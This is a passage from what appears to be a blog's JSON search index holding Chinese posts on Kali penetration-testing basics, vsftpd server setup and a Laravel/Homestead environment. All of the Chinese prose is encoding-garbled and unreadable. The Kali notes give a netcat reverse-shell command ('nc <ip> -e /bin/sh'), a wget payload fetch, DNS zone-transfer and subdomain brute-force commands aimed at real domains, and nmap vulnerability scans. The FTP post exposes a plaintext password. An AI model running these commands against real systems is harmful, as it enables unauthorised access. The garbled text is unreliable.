\t//‰∏ãËΩΩÊõ¥Êñ∞ÂàóË°®/Êõ¥Êñ∞ÂØπÂ∫îËΩØ‰ª∂   * apt-get dist-upgrade\t\t//‰∏ãËΩΩÂØπÂ∫î‰æùËµñÂåÖ   * apt-get clean\t\t\t\t//Ê∏ÖÈô§ÂÜó‰ΩôÊñá‰ª∂        Vmware Tools(ÊªöÂä®Êõ¥Êñ∞Áâà)          apt -y install open-vm-tools-desktop fuse      reboot        ÂÆâË£ÖVPN          ÂÆâË£Öopenvpn      2.3 Kali ËøõÈò∂‰ΩøÁî®  ÁéØÂ¢ÉÂèòÈáè          env                  env | grep -i path //-iÂøΩÁï•Â§ßÂ∞èÂÜô          echo $PATH                      ÊêúÁ¥¢          whereis/which ifconfig //Âú®$PATHÂíå$MANPATHËÉΩÊâæÂà∞ifconfig/Âú®$PATH      locate Âú®updatedbÊï∞ÊçÆÂ∫ì‰∏≠ÂåπÈÖçÂ≠óÁ¨¶‰∏≤      find /ÔºàÊåáÂÆöÁõÆÂΩïÔºâ -type fÔºàÊñá‰ª∂Ôºâ„ÄÅdÔºàÁõÆÂΩïÔºâ -nameÔºàÊåáÂÆöÂêçÁß∞Ôºâ        netcat ÁëûÂ£´ÂÜõÂàÄ          nc -nlp  -vv ÁõëÂê¨Á´ØÂè£                  nc -p 443 ÊåáÂÆöÁ´ØÂè£Âè∑ÁõëÂê¨443Á´ØÂè£          nc -l ÁõëÂê¨ÔºàÊúçÂä°Á´ØÔºâ          nc -n ‰∏çËß£ÊûêÂüüÂêç          nc -vv ËØ¶ÁªÜ‰ø°ÊÅØ          ÂÆûÁé∞ÊúçÂä°Âô®Á´ØËé∑ÂæóÂÆ¢Êà∑Á´ØÁöÑshell                          nc -lnp &lt;ÔºàÊúçÂä°Âô®Á´ØÔºâip&gt;   //ÊúçÂä°Âô®ÁõëÂê¨ÂºÄÂêØ              nc &lt;ÔºàÊúçÂä°Âô®Ôºâip&gt;  -eÔºàÊâßË°åÁ®ãÂ∫èÔºâ /bin/sh  //ÂÆ¢Êà∑Á´ØÊääshell‰º†ÈÄíÁªôÊúçÂä°Âô®ÔºåÂ∞±ÂèØ‰ª•Âú®ÊúçÂä°Âô®‰∏äËæìÂÖ•Êåá‰ª§ÊéßÂà∂ÂÆ¢Êà∑Á´Ø              /bin/sh linuxÁ±ª‰ºº‰∫éWindowsÁöÑcmdÊé•Âè£Á®ãÂ∫è                                            kaliÊúçÂä°Âô®ÂÆ¢Êà∑Á´Ø          pythonËΩªÈáèÁ∫ßwebÊúçÂä°Âô®                  python -m SimpleHTTPServer 80                    wget  -O /tmp/1.exe\t\t//-OÂÆûÁé∞Âú®ÊåáÂÆöÁõÆÂΩï‰∏ã‰øùÂ≠ò        ËΩØ‰ª∂Â∑•ÂÖ∑ÁöÑÂÆâË£Ö          apt                  apt-cache search/show packagename ÊêúÁ¥¢ÂåÖ          apt-get install packagename ‚Äìreinstall ÂÆâË£Ö/ÈáçÊñ∞ÂÆâË£Ö          apt-get remove packagename Âà†Èô§ÂåÖ          apt-get autoclean Ê∏ÖÁêÜÊó†Áî®ÂåÖ          apt-get check Ê£ÄÊü•ÊòØÂê¶ÊúâÊçüÂÆ≥                    dpkg                  dbkg -i package-deb                    git      ‰∏ãËΩΩÊ∫ê‰ª£Á†ÅÂéãÁº©ÂåÖ                  wget (tgz)          tar -xzvf archive.tar.gz          ./configure          make          make install                    3. ‰ø°ÊÅØÊî∂ÈõÜ3.1 ÁΩëÁªú‰ø°ÊÅØÊî∂ÈõÜ  ÁΩëÁªú‰ø°ÊÅØÊî∂ÈõÜ          whoisÊï∞ÊçÆÂ∫ìÔºöÊü•ËØ¢InternetÊ≥®ÂÜå‰ø°ÊÅØÁöÑÊ†áÂáÜÂçèËÆÆ„ÄÅÂüüÂêçÊèê‰æõÂïÜ„ÄÅÂüüÂêçÊúçÂä°Âô®                  whois                     ÂüüÂêçÊü•ËØ¢ÔºöÊü•ËØ¢DNSÊúçÂä°Âô®                  nslookup                          baidu.com              set type=ns/A/mx              server ns1.cnhubei.com              ls cnhubei.com                                host -t mx baidu.com                          host -l sda.gov.cn ns.sda.gov.cn //ÂèëËØ∑Ê±ÇÂà∞ÂüüÂêçÊúçÂä°Âô®Ë¶ÅÊ±ÇÂàóÂá∫Â≠êÂüüÂêç                                digÂëΩ‰ª§                          dig ns sda.gov.cn              dig axfr                                dnsenum ‚Äìenum sda.gov.cn          fierce:ÂüüÂêçÁåúÊµã                          fierce -dns 163.com -wordlist dns-names.txt -threads 50 //ÂêåÊó∂Ëµ∑50‰∏™Á∫øÁ®ãÊ†πÊçÆÊèê‰æõÁöÑÂ≠óÂÖ∏ÁåúÊµãÂ≠êÂüüÂêç              Ëá™Â∏¶Â≠óÂÖ∏‰ΩçÁΩÆÔºö/usr/share/fierce/hosts.txt              cat 163.com.dns.txt | awk -F'/t' '{printf\"%s\\t%s\\n\",$2,$1}' | sort //ÊåâÁÖßÈúÄÊ±ÇÂàÜÂâ≤              awkÊñáÊú¨Â§ÑÁêÜÂ∑•ÂÖ∑ -FÂàÜÂâ≤Âüü              windows‰ΩøÁî®layerÂ≠êÂüüÂêçÊü•ËØ¢Êú∫                                DNSÂüü‰º†ÈÄÅÊ≥ÑÈú≤ÔºàÂüüÂêçÈÅçÂéÜÔºâÊºèÊ¥ûÔºöDNSÊúçÂä°Âô®‰∏çÂä†Á°ÆËÆ§Â∞±ÂêëÂØπÊñπÊèê‰æõÂüüÂêçÊï∞ÊçÆÂ∫ìÂ§á‰ªΩ                    Âü∫‰∫éÊêúÁ¥¢ÂºïÊìéÁöÑ‰ø°ÊÅØÊé¢Êµã                  google/baidu                          site:sjtu.edu.cnÊ†πÊçÆÂüüÂêçÊêúÁ¥¢              filetype:php ÊêúÁ¥¢PHPÁïåÈù¢              inurl:login\t\turl‰∏≠ÂåÖÊã¨Âì™‰∫õÂÖ≥ÈîÆËØç              intitileÔºö\t\t//Âú®ÁΩëÈ°µÊ†áÈ¢ò‰∏≠ÂåÖÂê´ÁöÑ              intextÔºö\t\t\t//Âú®ÂÜÖÂÆπ‰∏≠ÂåÖÂê´ÁöÑ              link                                Google Hacking Database ÈªëÂÆ¢ÊêúÁ¥¢ËØ≠Âè•ÁöÑÊï∞ÊçÆÂ∫ì                          Âü∫‰∫éGHDBÁöÑSiteDigger                                theharvester -d hrw.org -b all //ÊêúÁ¥¢ÈÇÆ‰ª∂          maltego‰∫íËÅîÁΩëÊÉÖÊä•Êî∂ÈõÜÂπ≥Âè∞ÔºåÁ§æÂ∑•Â∑•ÂÖ∑                          maltegoce              ËæìÂÖ•ÁõÆÊ†áÂüüÂêçÔºöInfrastructure -&gt;ÊãñÊãΩdomainËäÇÁÇπ                                recon-ng                          use recon/domains-hosts/bing_domain_web              set source sjtu.edu.cn              Êï∞ÊçÆÂ∫ì‰ΩçÁΩÆ /.recon-ng/workspaces/default              Áî®ÁÅ´ÁãêÊâìÂºÄfirefox resutl.html                                            ‰∏ªÊú∫‰ø°ÊÅØÊî∂ÈõÜ          ‰∏ªÊú∫Á´ØÂè£ÂèäÊúçÂä°                  NetbiosÊñá‰ª∂ÂÖ±‰∫´ÊúçÂä° Á´ØÂè£Âè∑135-139,445(windows‰∏ìÊúâ)                    Á´ØÂè£Êâ´Êèè                  Â∏∏ËßÑÊâ´ÊèèÔºå‰∏âÊ¨°Êè°Êâã„ÄÇË∞ÉÁî®socketÂ∫ì‰∏≠connectÂáΩÊï∞                          NmapÊâ´ÊèèÂô®                                  TCP SYNÊâ´Êèè                                          Êâ´ÊèèÁªìÊûúÂàÜ‰∏∫‰∏âÁßç                                                  open\t\tÂºÄÊîæÁöÑÁ´ØÂè£                          reset\t‰∏çÊèê‰æõÊúçÂä°ÁöÑÁ´ØÂè£                          close\tÈò≤ÁÅ´Â¢ôËøáÊª§                                                                                                      TCP FINÊâ´ÊèèÔºàËØØÊä•ÂæàÂ§öÔºâ                                          Ê≤°ÊúâÂõûÂ∫î\tÂºÄÊîæÁ´ØÂè£                      RSTÈáçÁΩÆ\t‰∏çÊèê‰æõÊúçÂä°ÁöÑÁ´ØÂè£                                                        ‰ΩøÁî®libpcap                  -Pn ËÆ§ÂÆöÊâÄÊúâ‰∏ªÊú∫Âú®Á∫øÔºåË∑≥Ëøá‰∏ªÊú∫ÂèëÁé∞                  nmap -sP                   nmap -sT 172.16.1.1-254 -p 139,445 -Pn ‚Äìopen\t\t//-Pn‰∏çpingÂØπÊñπ                  nmap ËÑöÊú¨‰ΩçÁΩÆÔºö /usr/share/nmap/scripts                  nmapËÑöÊú¨Á±ªÂûã Áúã‰∏ÄÈÅç                                          auth: Ë¥üË¥£Â§ÑÁêÜËÆ§ËØÅËØÅ‰π¶(ÁªïÂºÄËÆ§ËØÅ)ÁöÑËÑöÊú¨;                      broadcast: Âú®Â±ÄÂüüÁΩëÂÜÖÊé¢Êü•Êõ¥Â§öÊúçÂä°ÂºÄÂêØÁä∂ÂÜµÔºåÂ¶Çdhcp/dns/sqlserverÁ≠âÊúçÂä°;                      brute: Êèê‰æõÊö¥ÂäõÁ†¥Ëß£ÊñπÂºèÔºåÈíàÂØπÂ∏∏ËßÅÁöÑÂ∫îÁî®Â¶Çhttp/snmpÁ≠â;                      default: ‰ΩøÁî®-sCÊàñ-AÈÄâÈ°πÊâ´ÊèèÊó∂ÂÄôÈªòËÆ§ÁöÑËÑöÊú¨ÔºåÊèê‰æõÂü∫Êú¨ËÑöÊú¨Êâ´ÊèèËÉΩÂäõ;                      discovery: ÂØπÁΩëÁªúËøõË°åÊõ¥Â§öÁöÑ‰ø°ÊÅØÔºåÂ¶ÇSMBÊûö‰∏æ„ÄÅSNMPÊü•ËØ¢Á≠â;                      dos: Áî®‰∫éËøõË°åÊãíÁªùÊúçÂä°ÊîªÂáª;                      exploit: Âà©Áî®Â∑≤Áü•ÁöÑÊºèÊ¥ûÊîªÂáªÁ≥ªÁªü;                      external: Âà©Áî®Á¨¨‰∏âÊñπÁöÑÊï∞ÊçÆÂ∫ìÊàñËµÑÊ∫êÔºå‰æãÂ¶ÇËøõË°åwhoisËß£Êûê;                      fuzzer: Ê®°Á≥äÊµãËØïÔºåÂèëÈÄÅÂºÇÂ∏∏ÁöÑÂåÖÂà∞ÁõÆÊ†áÊú∫ÔºåÊé¢ÊµãÊΩúÂú®ÊºèÊ¥û;                      intrusive: Â∏¶ÊúâÂÖ•‰æµÊÄßÔºåÂèØËÉΩÂºïÂèëÂØπÊñπÁöÑIDS/IPSÁöÑËÆ∞ÂΩïÊàñÂ±èËîΩ;                      malware: Êé¢ÊµãÁõÆÊ†áÊú∫ÊòØÂê¶ÊÑüÊüì‰∫ÜÁóÖÊØí„ÄÅÂºÄÂêØ‰∫ÜÂêéÈó®Á≠â‰ø°ÊÅØ;                      safe: ‰∏éintrusiveÁõ∏ÂèçÔºåÂ±û‰∫éÂÆâÂÖ®ÊÄßËÑöÊú¨;                      version: Â¢ûÂº∫ÊúçÂä°‰∏éÁâàÊú¨Êâ´Êèè(Version Detection)ÂäüËÉΩ;                      vuln: Ê£ÄÊü•ÁõÆÊ†áÊú∫ÊòØÂê¶ÊúâÂ∏∏ËßÅÁöÑÊºèÊ¥û(Vulnerability)ÔºåÂ¶ÇMS08_067„ÄÅMS17_010Á≠â„ÄÇ                      smb-vuln-ms17-010.nse  //Ê∞∏ÊÅí‰πãËìùÊºèÊ¥ûÊ£ÄÊµãËÑöÊú¨                                                        nmapÂ∏∏ËßÑÁî®Ê≥ï                                          nmap -sT(Â∏∏ËßÑ‰∏âÊ¨°Êè°ÊâãÂçèËÆÆ) -sS(SYNÊâ´Êèè) -PnÔºàÊâ´ÊèèÊó∂‰∏çÂéªpingÂØπÊñπÔºâ                      nmap ‚Äìscript=default -Pn                       nmap ‚Äìscript=smb-vuln* -Pn                       nmap -A -Pn 192.168.80.201  //ÁªºÂêàÊÄßÊâ´Êèè-A                      nmap -sS -Pn -p 21-23,25,80,110,135- 139,143,443,445,1433,1521,3306,3389,5556,5631,5900,8080 192.168.80.1-254 ‚Äìopen   //Êâ´ÊèèÁâπÂÆöÁ´ØÂè£                                                        nmapÂõæÂΩ¢ÂåñÂâçÁ´ØZenmap                                            nc 172.16.1.201 80                                                      HEADÂè™ÂõûÂ∫îÂ§¥ÈÉ®Êï∞ÊçÆÔºåÊâ´ÊèèÊó∂‰ΩøÁî®ÔºåÂèØ‰ª•ÂæóÂà∞ÊóóÊ†á‰ø°ÊÅØbanner                      ÊñπÊ≥ï1Ôºö  HEAD / HTTP/1.1  HOST:172.16.1.201  ÊñπÊ≥ï2Ôºö  GET /HTTP/1.1  HOST:172.16.1.201                                                        nginx È°∫Â∫è‰∏äÊúçÂä°Âô®‰ø°ÊÅØÂú®ÂâçÔºåÊó•ÊúüÂú®Âêé                  apache ‰∏énginxÁõ∏ÂèçÔºåÊó•Êúü‰ø°ÊÅØÂú®ÂâçÔºåÊúçÂä°Âô®‰ø°ÊÅØÂú®Âêé                                                                                ‰∏ªÊú∫Êìç‰ΩúÁ≥ªÁªüÁöÑÊé¢Êµã   \t* nmap-os-dbÊìç‰ΩúÁ≥ªÁªüÊåáÁ∫πÊï∞ÊçÆÂ∫ì‰∏çÊñ≠Êõ¥Êñ∞   \t* nmap -sS 172.16.1.201 -Pn -p 139,445,80 -O  //-OÊìç‰ΩúÁ≥ªÁªü¬∑   \t* -sTÔºàÂèëÈÄÅACKÂåÖÔºâ -sSÔºàÂèëÈÄÅSYNÂåÖÔºâ -sVÔºàÊ†πÊçÆÂºÄÊîæÁ´ØÂè£Ëé∑ÂèñÁ≥ªÁªü‰ø°ÊÅØÔºâ -Pn -p -OÔºàÊêúÁ¥¢Êìç‰ΩúÁ≥ªÁªüÔºâ            ÊºèÊ¥ûÊâ´Êèè                  CVE(Common Vulnerability Exposures)ÈÄöÁî®ÊºèÊ¥ûÊä´Èú≤Â∫ì: ËÆæÁΩÆÊºèÊ¥ûÁºñÂè∑          NVD(National Vulnerability Database): Â§ö‰∏™CVEÂÆâÂÖ®ÊºèÊ¥ûËØ¶ÁªÜ‰ø°ÊÅØ          Nessus: ÁªºÂêàÊÄßÊºèÊ¥ûÊé¢Êµã ÔºàÊ≥®ÂÜå‰∏ÄÊ≥¢Ôºâ                          Êâ´ÊèèÁ≠ñÁï•              Êâ´ÊèèÁõÆÊ†á              Êâ´ÊèèÁªìÊûú                                OpenVas kaliËá™Â∏¶Ôºå‰∏çÂ•ΩÁî®                    WebÊºèÊ¥ûÊé¢Êµã                  w3af: Web Application Attack Framework          nikto                      Â±ÄÂüüÁΩë‰ø°ÊÅØÊêúÁ¥¢          ‰∏ªÊú∫ÂèëÁé∞                  ICMPÂçèËÆÆÁ†îÁ©∂‰∏ÄÊ≥¢ÔºàÂ≠òÂú®ICMPÂπøÊí≠È£éÊö¥Ôºå‰ΩøÁî®Â∑≤ÁªèËøáÊó∂Ôºâ                          8Â≠óËäÇÔºå1‰∏™Ëá™Â∑±typeÔºå1‰∏™Â≠óËäÇcode              echo request 8 0              echo reply 0 0                                ARPÔºåAddress Resolution Protocol(ÈìæË∑ØÂ±Ç)ÔºöÂØªÊâæÂì™‰∏™IPÂú∞ÂùÄÂØπÂ∫îÁöÑMacÂú∞ÂùÄ‰∏∫ÁõÆÁöÑÂú∞ÂùÄÔºåÂØπÂ∫îÂèëÈÄÅÊï∞ÊçÆÂåÖ                          ARPÂçèËÆÆËß£ÊûêËøáÁ®ãÁ†îÁ©∂‰∏ÄÊ≥¢              IPv4(ÁΩëÁªúÂ±Ç)              Êï∞ÊçÆÂåÖÂØªÂùÄÈÄöËøáMacÂú∞ÂùÄ              ARPÂëΩ‰ª§                                  -a                                                                        NetDiscoverÊâæÂ±ÄÂüüÁΩë‰∏≠Â≠òË¥ß‰∏ªÊú∫      "
  },
  
  {
    "title": "ÈòøÈáå‰∫ëubuntuÈÖçÁΩÆFTPÊúçÂä°Âô®",
    "url": "/posts/%E9%98%BF%E9%87%8C%E4%BA%91ubuntu%E9%85%8D%E7%BD%AEFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/",
    "categories": "",
    "tags": "Website",
    "date": "2017-09-20 00:00:00 -0700",
    





    
    "snippet": "ÈòøÈáå‰∫ëubuntuÈÖçÁΩÆFTPÊúçÂä°Âô®FTPÂéüÁêÜ  ‰∏ªÂä®FTPÔºö          ÂëΩ‰ª§ËøûÊé•ÔºöÂÆ¢Êà∑Á´Ø &gt;1023Á´ØÂè£ -&gt; ÊúçÂä°Âô® 21Á´ØÂè£      Êï∞ÊçÆËøûÊé•ÔºöÂÆ¢Êà∑Á´Ø &gt;1023Á´ØÂè£ &lt;- ÊúçÂä°Âô® 20Á´ØÂè£        Ë¢´Âä®FTPÔºö          ÂëΩ‰ª§ËøûÊé•ÔºöÂÆ¢Êà∑Á´Ø &gt;1023Á´ØÂè£ -&gt; ÊúçÂä°Âô® 21Á´ØÂè£      Êï∞ÊçÆËøûÊé•ÔºöÂÆ¢Êà∑Á´Ø &gt;1023Á´ØÂè£...",
    "content": "ÈòøÈáå‰∫ëubuntuÈÖçÁΩÆFTPÊúçÂä°Âô®FTPÂéüÁêÜ  ‰∏ªÂä®FTPÔºö          ÂëΩ‰ª§ËøûÊé•ÔºöÂÆ¢Êà∑Á´Ø &gt;1023Á´ØÂè£ -&gt; ÊúçÂä°Âô® 21Á´ØÂè£      Êï∞ÊçÆËøûÊé•ÔºöÂÆ¢Êà∑Á´Ø &gt;1023Á´ØÂè£ &lt;- ÊúçÂä°Âô® 20Á´ØÂè£        Ë¢´Âä®FTPÔºö          ÂëΩ‰ª§ËøûÊé•ÔºöÂÆ¢Êà∑Á´Ø &gt;1023Á´ØÂè£ -&gt; ÊúçÂä°Âô® 21Á´ØÂè£      Êï∞ÊçÆËøûÊé•ÔºöÂÆ¢Êà∑Á´Ø &gt;1023Á´ØÂè£ -&gt; ÊúçÂä°Âô® &gt;1023Á´ØÂè£      ÊïôÁ®ãÈÖçÁΩÆÊ≠•È™§  apt-get install vsftpd  ufw status //Êü•ÁúãÈò≤ÁÅ´Â¢ôËÆæÁΩÆÔºåÁî®Â¶Ç‰∏ãÂëΩ‰ª§ËÆæÁΩÆ          sudo ufw allow 20/tcp\t\t//ftpÁ´ØÂè£      sudo ufw allow 21/tcp\t\t//ftpÁ´ØÂè£      sudo ufw allow 990/tcp\t//TLSÁ´ØÂè£      sudo ufw allow 40000:50000/tcp\t//ËÆæÁΩÆÈÖçÁΩÆÊñá‰ª∂      sudo ufw status        adduser dangyuan\t\t//pswd:dangyuan  ËÆæÁΩÆfptÁî®Êà∑ÁöÑ‰∏ªÁõÆÂΩï          sudo mkdir /home/dangyuan/ftp      sudo chown nobody:nogroup /home/dangyuan/ftp      sudo chmod a-w /home/dangyuan/ftp        ËÆæÁΩÆÂèØ‰ª•‰∏ä‰º†Êñá‰ª∂ÁöÑÊñá‰ª∂Â§πÔºö          sudo mkdir /home/dangyuan/ftp/files      sudo chown dangyuan:dangyuan /home/dangyuan/ftp/files        ÊµãËØïÊñá‰ª∂                                                      echo ‚Äúvsftpd test file‚Äù              sudo tee /home/dangyuan/ftp/files/test.txt                                            vi /etc/vsftpd.conf          write_enable=YES      chroot_local_user=YES      user_sub_token=$USER      local_root=/home/$USER/ftp      pasv_min_port=40000      pasv_max_port=50000      userlist_enable=YES      userlist_file=/etc/vsftpd.userlist      userlist_deny=NO      pam_service_name=ftp/svftpd //‰ΩøÁî®ftpÊúçÂä°ÊàñËÄÖsftpÊúçÂä°      chroot_local_user=YES      anon_root=/var/www/html/                                    echo ‚Äúdangyuan‚Äù          sudo tee -a /etc/vsftpd.userlist                      systemctl restart vsftpd  ÊµãËØïftp -p 101.132.100.213  ËÆæÁΩÆÈò≤ÁÅ´Â¢ô          iptables -A INPUT -p tcp ‚Äìdport 21 -j ACCEPT      iptables -A INPUT -p tcp ‚Äìdport 20 -j ACCEPT      iptables -A INPUT -p tcp ‚Äìdport 40000:50000 -j ACCEPT        ÈÅáÂà∞ÈóÆÈ¢òÔºåÊµãËØïÊäìÂåÖ          tcpdump -n -i eth0 host 101.132.100.213 and 218.193.183.86      tcpdump host 101.132.100.213 and 218.193.183.86      ss -naltd      ÁªìËÆ∫ÔºöftpÂÆ¢Êà∑Á´ØÈúÄË¶ÅËÆæÁΩÆ‰∏∫FTPË¢´Âä®Ê®°Âºè        ËÆæÁΩÆËôöÊãüÁî®Êà∑  apt-get install db_util  db_load -T -t hash -f /home/loguser.txt /etc/vsftpd_login.db  chmod 600 /etc/vsftpd_login.db  vi /etc/pam.d/vsftpd          Âä†ÂÖ•Êñá‰ª∂ÂºÄÂ§¥‰∏§Ë°å      auth sufficient pam_userdb.so db=/etc/vsftpd_login      account sufficient pam_userdb.so db=/etc/vsftpd_login        ÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºåÊØèÊ¨°Êñ∞Â¢ûË¥¶Âè∑ÔºåÈúÄË¶ÅÂú®/etc/vsftpd.userlist‰∏≠Âä†ÂÖ•ÂØπÂ∫îÁöÑÁî®Êà∑Âêç"
  },
  
  {
    "title": "laravelËá™Â≠¶",
    "url": "/posts/laravel%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/",
    "categories": "",
    "tags": "Website",
    "date": "2017-07-30 00:00:00 -0700",
    





    
    "snippet": "2018-09-16: ÊÑüËßâdockerÊòØÊõ¥Â•ΩÁöÑÈÄâÊã©ÔºåÊâæÊú∫‰ºöÂÆûÈ™å‰∏Ä‰∏ã„ÄÇ7/30[Êé®Ëçê]‰ΩøÁî®MacÂÆâË£Övirtualbox+homesteadÈÖçÁΩÆlaravelÁéØÂ¢ÉÊ≥®Ôºö(‰∏ÄÂºÄÂßãÊ≤°Ê≥®ÊÑèÂà∞ÔºåËôΩÁÑ∂Ê≤°ÊúâÂ∞ùËØïËøáÔºå‰ΩÜÊòØÁõÆÂâçÊÑüËßâËøô‰∏™Êõ¥ÈÄÇÁî®)ValetÂè™ÊîØÊåÅMacÔºåÂπ∂‰∏îË¶ÅÊ±ÇÊú¨Âú∞ÂÆâË£Ö‰∫ÜPHPÂíåÊï∞ÊçÆÂ∫ìÊúçÂä°Âô®ÔºåËøôÂèØ‰ª•ÈÄöËøá‰ΩøÁî®HomebrewÂëΩ‰ª§ËΩªÊùæÂÆûÁé∞Ê†∏ÂøÉÊÄùÊÉ≥ÔºöÂú®virtualboxÈáåËøêË°åhomesteadËôöÊãüÊú∫Ôºå...",
    "content": "2018-09-16: ÊÑüËßâdockerÊòØÊõ¥Â•ΩÁöÑÈÄâÊã©ÔºåÊâæÊú∫‰ºöÂÆûÈ™å‰∏Ä‰∏ã„ÄÇ7/30[Êé®Ëçê]‰ΩøÁî®MacÂÆâË£Övirtualbox+homesteadÈÖçÁΩÆlaravelÁéØÂ¢ÉÊ≥®Ôºö(‰∏ÄÂºÄÂßãÊ≤°Ê≥®ÊÑèÂà∞ÔºåËôΩÁÑ∂Ê≤°ÊúâÂ∞ùËØïËøáÔºå‰ΩÜÊòØÁõÆÂâçÊÑüËßâËøô‰∏™Êõ¥ÈÄÇÁî®)ValetÂè™ÊîØÊåÅMacÔºåÂπ∂‰∏îË¶ÅÊ±ÇÊú¨Âú∞ÂÆâË£Ö‰∫ÜPHPÂíåÊï∞ÊçÆÂ∫ìÊúçÂä°Âô®ÔºåËøôÂèØ‰ª•ÈÄöËøá‰ΩøÁî®HomebrewÂëΩ‰ª§ËΩªÊùæÂÆûÁé∞Ê†∏ÂøÉÊÄùÊÉ≥ÔºöÂú®virtualboxÈáåËøêË°åhomesteadËôöÊãüÊú∫ÔºåÂπ∂‰∏î‰ΩøÂæóËôöÊãüÊú∫Âíå‰∏ªÊú∫ÂÖ±‰∫´‰∏Ä‰∏™Êñá‰ª∂Â§πÔºåÊäälaravelÂÆâË£ÖÂú®Ëøô‰∏™Êñá‰ª∂Â§πÈáåÔºå‰ΩøÂæóÈÖçÁΩÆÂíåËøêË°åÊó∂Âú®ËôöÊãüÊú∫ÈáåÊìç‰ΩúËøô‰∏™Êñá‰ª∂Â§πÔºåÂú®Êú¨Êú∫‰ΩøÁî®ÁºñËæëÂô®Êìç‰ΩúlaravelÈáåÁöÑÊñá‰ª∂„ÄÇ  ÂÆâË£Öhomestead      Áî®Êà∑Âêç/ÂØÜÁ†ÅÔºövagrant/vagrant    vagrantÂëΩ‰ª§vagrantÂíåhomesteadÁöÑÁêÜËß£ÔºövagrantÊòØ‰∏Ä‰∏™ÁÆ°ÁêÜËôöÊãüÊú∫ÁöÑÂ∑•ÂÖ∑„ÄÇÂØπ‰∫éMacÁöÑlaravel/homesteadÂÆòÊñπÊñáÊ°£Êù•ËØ¥ÔºåÈ¶ñÂÖàÂú®Ê†πÁõÆÂΩï‰∏ãÂÆâË£ÖhomesteadÔºåÁõ∏ÂΩì‰∫éÊúâ‰∏Ä‰∏™ÊÄªÁöÑËôöÊãüÊú∫„ÄÇÊØèÊ¨°Êñ∞Âª∫È°πÁõÆÊó∂ÔºåÁé∞Âú®ÊÄªÁöÑËôöÊãüÊú∫ÈáåÂØπÂ∫îÊñá‰ª∂Â§π‰∏ã(Â¶Ç~/Code)Êñ∞Âª∫laravelÈ°πÁõÆÔºåÁÑ∂Âêécomposer require laravel/homestead ‚ÄìdevÂÆâË£ÖÂàÜÂà´ÁöÑËôöÊãüÊú∫ÔºåÂÆûÁé∞ÊØè‰∏™È°πÁõÆÂçïÁã¨‰∏Ä‰∏™ÁéØÂ¢É„ÄÇ‰πãÂêé‰øÆÊîπhomestead.yamlÊñá‰ª∂‰ª•ÂèähostsÊñá‰ª∂ÔºåÂÆåÊàêÊï¥‰∏™Êñ∞Âª∫È°πÁõÆÁöÑ‰ªªÂä°„ÄÇ\t1. ÊâæÂà∞Ê†πÁõÆÂΩï‰∏ãÁöÑhomesteadÔºåvagrant upÂêØÂä®ËôöÊãüÊú∫„ÄÇ\t2. Âú®CodeÊñá‰ª∂Â§π‰∏ãlaravel new blogÊñ∞Âª∫‰∏Ä‰∏™È°πÁõÆ\t3. composer require laravel/homestead --dev ÂÆâË£ÖÈ°πÁõÆËá™Â∑±ÁöÑhomestead\t4. ÂÆûÁé∞ÊØè‰∏™È°πÁõÆÊúâÂçïÁã¨ÁöÑËôöÊãüÊú∫ÂêØÂä® --------* vagrant up\t[vm-name]\tÂêØÂä®ÂçïËôöÊãüÊú∫[ÁâπÂÆöËôöÊãüÊú∫]* vagrant box add [box-name]\tÂ¢ûÂä†ÈïúÂÉè* vagrant box remove [box-name]\tÂà†Èô§ÈïúÂÉè* vagrant reload\tÈáçÂêØ* vagrant halt\tÂÖ≥Èó≠* vagrant destroy\tÈîÄÊØÅ* vagrant snapshot save shot1\tÂø´ÁÖß* vagrant reload --provision ‰øÆÊîπHomestead.yamlÂêéÈáçÂêØÂπ∂ËØªÂèñÈÖçÁΩÆÊñá‰ª∂* ÁªôÊØè‰∏™È°πÁõÆÂÆâË£Ö‰∏çÂêåÁöÑ Homestead ÈÖçÁΩÆÊñá‰ª∂ÔºåÁõ¥Êé•ÂÆâË£ÖËá≥È°πÁõÆ‰∏≠*ÔºàÊØè‰∏™È°πÁõÆÂàÜÂà´Êúâ‰∏Ä‰∏™homesteadÔºâ*\t* Êñ∞Âª∫È°πÁõÆÔºö laravel new app \t* appË∑ØÂæÑ‰∏ãÔºåËôöÊãüÊú∫ËæìÂÖ•ÂëΩ‰ª§Ôºöcomposer require laravel/homestead --dev \t* ËôöÊãüÊú∫Ôºöphp vendor/bin/homestead make\t* /etc/hostsÊñá‰ª∂Â¢ûÂä†ÂØπÂ∫îÁöÑIPÂú∞ÂùÄÂíåË∑ØÁî±\t* ËΩ¨Êç¢È°πÁõÆÂàôÂú®ÊÄªÁöÑHomesteadÊñá‰ª∂Â§πÈáåhomestead.yamlÈÖçÁΩÆÊñá‰ª∂‰øÆÊîπipÂú∞ÂùÄ‰∏∫ÂØπÂ∫îÁöÑipÂú∞ÂùÄ\t* ÈáçÂêØËôöÊãüÊú∫Ôºövagrant reload --provision* mysqlÁ´ØÂè£„ÄÅÁî®Êà∑ÂêçÂØÜÁ†ÅÔºö3306Ôºà33060Ôºâ/homestead/secret\t* *Ê≥®ÊÑèÔºörootÁî®Êà∑ÁöÑÂØÜÁ†Å‰πüÊòØsecret** SSH: 2222 ‚Üí Forwards To 22* HTTP: 8000 ‚Üí Forwards To 80* HTTPS: 44300 ‚Üí Forwards To 443* MySQL: 33060 ‚Üí Forwards To 3306* Postgres: 54320 ‚Üí Forwards To 5432       nginx‰ΩøÁî®nginxÂ∫îËØ•ÊòØÂÆâË£ÖÂú®homesteadËôöÊãüÊú∫ÈáåÁöÑÔºåÊú¨Êú∫‰∏çÈúÄË¶ÅÂÆâË£Ö„ÄÇ          Êü•ÁúãÊòØÂê¶ÂêØÂä®Ôºö ps -ef|grep nginx      Êü•ÁúãÁ´ØÂè£Âç†ÊúâÊÉÖÂÜµÔºönetstat -ntpl      Êü•ÁúãlaravelÁâàÊú¨(laravelÊñá‰ª∂ÁõÆÂΩï‰∏ã)Ôºöphp artisan ‚Äìversion            Ê≠£Â∏∏Êìç‰Ωú          vagrant up      vagrant ssh      vagrant halt      ÁîüÊàêauthÊ®°ÂùóÔºöphp artisan make:auth      7/31  Êñ∞Âª∫laravelÈ°πÁõÆ composer ÊàñËÄÖ laravel new blog  ÂêØÂä®laravelÊúçÂä°Âô®Ôºöphp artisan serve      laravelÊñá‰ª∂Â§πÁªìÊûÑ          routesÔºöË∑ØÁî±ÊÉÖÂÜµ      resources/viewsÔºöÁïåÈù¢            ÊäÄÂ∑ß          sublimeÔºöcmd+P‚Äìrweb-&gt;routes/web.php      